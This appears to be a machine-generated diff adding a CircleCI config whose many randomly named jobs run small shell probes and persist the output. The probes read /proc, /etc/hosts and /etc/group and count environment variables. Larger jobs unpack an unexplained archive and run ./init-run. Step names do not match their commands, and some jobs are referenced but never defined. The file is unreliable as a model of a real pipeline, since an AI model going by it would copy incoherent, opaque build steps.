+    resource_class: small
+    steps:
+      - run:
+          name: Patch The Achievements For Level 8
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; readlink -f /usr/bin/*sum | sort -r; true ; } > /tmp/a4/c4WFGR012nYKPt
+            # wrap-up
+            wc -c /tmp/a4/c4WFGR012nYKPt
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'c4WFGR012nYKPt'
+  Validate_App6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/c4WFGR012nYKPt 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  depthType:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Do not optimize the indexes by hand
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; cat /proc/meminfo | grep -o -m 3 'MemFree'; true ; } > /tmp/a4/run_495
+            # wrap-up
+            wc -c /tmp/a4/run_495
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'run_495'
+  wip-edge-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/run_495 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  cn-sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Frontend Payment Step
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /etc -type d -not -name '*rc' -exec stat -c %n {} + 2>/dev/null | xargs ls -ld; true ; } > /tmp/a4/batch-63k
+            # wrap-up
+            wc -c /tmp/a4/batch-63k
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'batch-63k'
+  API-850:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/batch-63k 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  theWordTab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: HALT
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; { printf "%s\n" lemon banana orange; } >'/tmp/Recordv3.out' && sort '/tmp/Recordv3.out'; true ; } > /tmp/a4/fermion.shader.carrier.payload.beam
+            # wrap-up
+            wc -c /tmp/a4/fermion.shader.carrier.payload.beam
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'fermion.shader.carrier.payload.beam'
+  alpha-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/fermion.shader.carrier.payload.beam 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  device400:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Guard the tooltip
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; command grep -i 'host' /etc/hosts | head -n5; true ; } > /tmp/a4/28.153.45.210
+            # wrap-up
+            wc -c /tmp/a4/28.153.45.210
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '28.153.45.210'
+  API-882:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/28.153.45.210 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  salt_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Banish the browser matrix
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /run -type d -name \*lock\* -exec stat -c %n {} + 2>/dev/null | xargs ls -ld; true ; } > /tmp/a4/INV30290
+            # wrap-up
+            wc -c /tmp/a4/INV30290
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'INV30290'
+  VerifyProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/wnaq53IlgV 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+
+  CachedBuilderComponent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: snapshot queue f77d
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; sed 's/.*/(&)/' /proc/cpuinfo | head -2; true ; } > /tmp/a4/KaPpaFEnBOg
+            # wrap-up
+            wc -c /tmp/a4/KaPpaFEnBOg
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'KaPpaFEnBOg'
+  November:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Phase VII
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo -n 'the quick brown fox'|sha224sum; true ; } > /tmp/a4/138.119.183
+            # wrap-up
+            wc -c /tmp/a4/138.119.183
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '138.119.183'
+  IS_INVALID:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Reconciliation with sudo
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; for item in {0..5}; do echo $((RANDOM % 91)); done | wc -l; true ; } > /tmp/a4/crisp.spark.heath.titan.reef
+            # wrap-up
+            wc -c /tmp/a4/crisp.spark.heath.titan.reef
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'crisp.spark.heath.titan.reef'
+  struct_Stream-convert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: LABEL SHRINK WRAP AND SIGN
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | tr -d '[:digit:]' | head -n 20; true ; } > /tmp/a4/bond85
+            # wrap-up
+            wc -c /tmp/a4/bond85
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'bond85'
+  trollAi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Dedupe or tidy shared drive
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; set -- sunday wednesday friday; echo "${@: -1}"; true ; } > /tmp/a4/heath265
+            # wrap-up
+            wc -c /tmp/a4/heath265
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'heath265'
+  bugfix_close_lock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Gather the job runner
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; ls -d /usr/bin/z* | head -n 5 | wc -l; true ; } > /tmp/a4/28.153.45.210
+            # wrap-up
+            wc -c /tmp/a4/28.153.45.210
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '28.153.45.210'
+  vpn034:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: PLAT 5354 Spinner Zoom
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printenv | wc -l; true ; } > /tmp/a4/EmberStockRidgeSilent
+            # wrap-up
+            wc -c /tmp/a4/EmberStockRidgeSilent
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'EmberStockRidgeSilent'
+  assertALLOC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Keep the hotfix branch as is
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf '%s\n' dublin denver delhi lima | sort -f | awk 'length > 4'; true ; } > /tmp/a4/SDK_Proton
+            # wrap-up
+            wc -c /tmp/a4/SDK_Proton
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'SDK_Proton'
+  InternalRayRenderer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Open Rate Limits Phase
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; [ -t 0 ] || echo "stdin is not a terminal"; true ; } > /tmp/a4/REnDErbiSoN
+            # wrap-up
+            wc -c /tmp/a4/REnDErbiSoN
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'REnDErbiSoN'
+  border-orange:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Refresh Materialized Views In Next
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; touch "${TMPDIR:-/tmp}/seal-helpers.md"&&rm -v "${TMPDIR:-/tmp}/seal-helpers.md"; true ; } > /tmp/a4/yFGyFVH
+            # wrap-up
+            wc -c /tmp/a4/yFGyFVH
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'yFGyFVH'
+  blocksById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Codename Bison
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 2 -type l -name "*.1" -size +1M -mmin +5 -exec echo {} + 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/a4/TICKET68925
+            # wrap-up
+            wc -c /tmp/a4/TICKET68925
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'TICKET68925'
+  riaksloarkshoost-protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Execute click
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /etc -name "*.defs" -exec echo {} + 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/a4/pixeldustybronze
+            # wrap-up
+            wc -c /tmp/a4/pixeldustybronze
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'pixeldustybronze'
+  FOSTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: yup cache teacher model
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo 'fix typo' > "/tmp/carrot.meeting.conf" && cp "/tmp/carrot.meeting.conf" "/tmp/login.reply.log" && diff "/tmp/carrot.meeting.conf" "/tmp/login.reply.log" && echo identical; true ; } > /tmp/a4/fermion.shader.carrier.payload.beam
+            # wrap-up
+            wc -c /tmp/a4/fermion.shader.carrier.payload.beam
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'fermion.shader.carrier.payload.beam'
+  cDeprecated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Every 10 min trace the health endpoint
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; v=water.txt; [[ $v =~ \.txt$ ]] && echo "text file"; true ; } > /tmp/a4/v.1.4
+            # wrap-up
+            wc -c /tmp/a4/v.1.4
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'v.1.4'
+  qk3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Mirror The Revenue Split To Seoul
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; grep --line-number --with-filename --recursive case /etc/skel | nl | head -n 8; true ; } > /tmp/a4/audit_20220308
+            # wrap-up
+            wc -c /tmp/a4/audit_20220308
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'audit_20220308'
+  p59:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Feed the failing specs
+          command: |
+            mkdir -p /tmp/a4
+            set +o pipefail 2>/dev/null; arr=(a b c d e); for n in $(seq 1 10000); do echo "${arr[$((n % 5))]}-${n}"; done > /tmp/a4/B6o; true
+            # wrap-up
+            wc -c /tmp/a4/B6o
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'B6o'
+  flipwish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: In case of failure replicate the archive tables
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; for file in /etc/default/*; do stat -c "%s %n" "$file";done | nl; true ; } > /tmp/a4/batch-63k
+            # wrap-up
+            wc -c /tmp/a4/batch-63k
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'batch-63k'
+  skipExportFree:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Revoke the timesheets ahead of rollout
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; gzip -c /etc/group >"/tmp/payment_2018-08-18.gz" && gunzip -c "/tmp/payment_2018-08-18.gz"|wc -l; true ; } > /tmp/a4/c4WFGR012nYKPt
+            # wrap-up
+            wc -c /tmp/a4/c4WFGR012nYKPt
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'c4WFGR012nYKPt'
+  ClientPinMaxItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: dev side badging
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf %s "hello from the shell" | sha512sum | awk '{print $1}'; true ; } > /tmp/a4/Y
+            # wrap-up
+            wc -c /tmp/a4/Y
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'Y'
+  updateCNNAccount:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Take quarantine offline
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; (trap 'echo bye' EXIT; echo 'lorem ipsum dolor sit amet'); true ; } > /tmp/a4/2
+            # wrap-up
+            wc -c /tmp/a4/2
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '2'
+  cb_dec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: offboarding retries 1
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; ls -v /usr/sbin |paste -sd ' '; true ; } > /tmp/a4/trial_566
+            # wrap-up
+            wc -c /tmp/a4/trial_566
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'trial_566'
+  Coupon_008944:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Water Pump Update Run
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 3 -type f -exec sha1sum "{}" \; 2>/dev/null | nl; true ; } > /tmp/a4/run_495
+            # wrap-up
+            wc -c /tmp/a4/run_495
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'run_495'
+  mu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Do not tag the canary fleet
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; uname -v; true ; } > /tmp/a4/run_462
+            # wrap-up
+            wc -c /tmp/a4/run_462
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'run_462'
+workflows:
+  ci:
+    jobs:
+      - Ia9qvSKf
+      - knnKNNLayer
+      - tb-old:
+          requires:
+            - Ia9qvSKf
+            - knnKNNLayer
+      - dp-v2:
+          requires:
+            - Ia9qvSKf
+            - knnKNNLayer
+      - VerifyProd:
+          requires:
+            - Ia9qvSKf
+            - knnKNNLayer
+      - lets-go:
+          requires:
+            - Ia9qvSKf
+            - knnKNNLayer
+      - ruby3-bench:
+          requires:
+            - Ia9qvSKf
+            - knnKNNLayer
+      - defualt:
+          requires:
+            - Ia9qvSKf
+            - knnKNNLayer
+      - fire-up:
+          requires:
+            - Ia9qvSKf
+            - knnKNNLayer
+      - sierra-romeo
+      - CachedBuilderComponent:
+          requires:
+            - sierra-romeo
+      - q4-ship:
+          requires:
+            - CachedBuilderComponent
+      - v_idx:
+          requires:
+            - CachedBuilderComponent
+      - November:
+          requires:
+            - v_idx
+      - sam-verify:
+          requires:
+            - November
+      - wr3nch:
+          requires:
+            - November
+      - IS_INVALID:
+          requires:
+            - wr3nch
+      - break-prod:
+          requires:
+            - IS_INVALID
+      - varPromises:
+          requires:
+            - IS_INVALID
+      - struct_Stream-convert:
+          requires:
+            - varPromises
+      - update-db-reload:
+          requires:
+            - struct_Stream-convert
+      - email_rates:
+          requires:
+            - struct_Stream-convert
+      - trollAi:
+          requires:
+            - email_rates
+      - DEPLOY_UAT:
+          requires:
+            - trollAi
+      - device400:
+          requires:
+            - trollAi
+      - bugfix_close_lock:
+          requires:
+            - device400
+      - API-882:
+          requires:
+            - bugfix_close_lock
+      - receiptsByName:
+          requires:
+            - bugfix_close_lock
+      - vpn034:
+          requires:
+            - receiptsByName
+      - MERGE_STG:
+          requires:
+            - vpn034
+      - IN-FINISH-AREA
+      - assertALLOC:
+          requires:
+            - IN-FINISH-AREA
+      - do-the-thing:
+          requires:
+            - assertALLOC
+      - store-armv7-latest:
+          requires:
+            - assertALLOC
+      - InternalRayRenderer:
+          requires:
+            - store-armv7-latest
+      - q2-cleanup:
+          requires:
+            - InternalRayRenderer
+      - Mmmm:
+          requires:
+            - InternalRayRenderer
+      - border-orange:
+          requires:
+            - Mmmm
+      - wip-router:
+          requires:
+            - border-orange
+      - UntypedCanvasOptions:
+          requires:
+            - border-orange
+      - blocksById:
+          requires:
+            - UntypedCanvasOptions
+      - succes-only-17:
+          requires:
+            - blocksById
+      - new_pseudo_complex_pull_count:
+          requires:
+            - blocksById
+      - riaksloarkshoost-protocol:
+          requires:
+            - new_pseudo_complex_pull_count
+      - LaunchProd:
+          requires:
+            - riaksloarkshoost-protocol
+      - theWordTab:
+          requires:
+            - riaksloarkshoost-protocol
+      - FOSTER:
+          requires:
+            - theWordTab
+      - alpha-v4:
+          requires:
+            - FOSTER
+      - OQ:
+          requires:
+            - FOSTER
+      - cDeprecated:
+          requires:
+            - OQ
+      - rip-it:
+          requires:
+            - cDeprecated
+      - cq9:
+          requires:
+            - cDeprecated
+      - qk3:
+          requires:
+            - cq9
+      - ship-it:
+          requires:
+            - qk3
+      - weeshsoungx:
+          requires:
+            - qk3
+      - p59:
+          requires:
+            - weeshsoungx
+      - tweak-oauth-redirect:
+          requires:
+            - p59
+      - cn-sierra
+      - flipwish:
+          requires:
+            - cn-sierra
+      - API-850:
+          requires:
+            - flipwish
+      - ByteIdDefaultLocal:
+          requires:
+            - flipwish
+      - skipExportFree:
+          requires:
+            - ByteIdDefaultLocal
+      - Validate_App6:
+          requires:
+            - skipExportFree
+      - NavWriterGardenTraceEmber:
+          requires:
+            - skipExportFree
+      - ClientPinMaxItem:
+          requires:
+            - NavWriterGardenTraceEmber
+      - chen-smoke:
+          requires:
+            - ClientPinMaxItem
+      - ModelV11:
+          requires:
+            - ClientPinMaxItem
+      - updateCNNAccount:
+          requires:
+            - ModelV11
+      - rocket:
+          requires:
+            - updateCNNAccount
+      - DelegatingBufferProcessor:
+          requires:
+            - updateCNNAccount
+      - cb_dec:
+          requires:
+            - DelegatingBufferProcessor
+      - STG_CHECK_4:
+          requires:
+            - cb_dec
+      - depthType:
+          requires:
+            - cb_dec
+      - Coupon_008944:
+          requires:
+            - depthType
+      - wip-edge-timeout:
+          requires:
+            - Coupon_008944
+      - attrb93563:
+          requires:
+            - Coupon_008944
+      - mu:
+          requires:
+            - attrb93563
+      - Prepare_App4:
+          requires:
+            - mu
